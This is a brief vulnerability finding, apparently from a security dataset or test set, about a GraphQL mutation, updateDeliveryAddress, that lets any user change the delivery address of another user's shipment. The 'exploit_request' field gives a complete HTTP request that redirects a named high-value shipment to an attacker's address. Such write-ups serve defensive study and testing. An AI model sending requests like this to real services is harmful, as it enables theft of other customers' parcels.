diagnosis: The schema stitching mutation resolver for updateDeliveryAddress delegates execution directly to an internal logistics subschema without verifying that shipmentId belongs to context.user.id. An attacker can provide another user's shipmentId to redirect valuable e-commerce deliveries to their own address.
exploit_request:
POST /graphql HTTP/1.1
Host: api.parcelexpress.com
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "query": "mutation { updateDeliveryAddress(shipmentId: \"shp_luxury_watch_991\", newAddress: \"123 Rogue St\") { success } }"
}
